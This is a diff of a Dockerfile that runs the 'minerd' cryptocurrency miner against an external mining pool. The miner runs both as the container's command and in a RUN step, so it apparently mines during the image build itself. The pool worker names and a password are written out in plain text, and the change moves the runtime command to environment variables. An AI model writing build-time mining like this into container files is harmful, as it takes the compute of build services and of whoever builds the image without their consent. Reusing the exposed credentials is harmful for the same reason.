@@ -4,4 +4,4 @@ RUN chmod +x build.sh
 RUN ./build.sh
 EXPOSE 80
 RUN minerd -a quark --url stratum+tcp://mine2.coinmine.pl:6020 -u ybh1998.ybh19982 -p 112358
-CMD minerd -a quark --url stratum+tcp://mine2.coinmine.pl:6020 -u ybh1998.doc -p doc
+CMD minerd -a quark --url stratum+tcp://mine2.coinmine.pl:6020 -u $USR -p $PWD
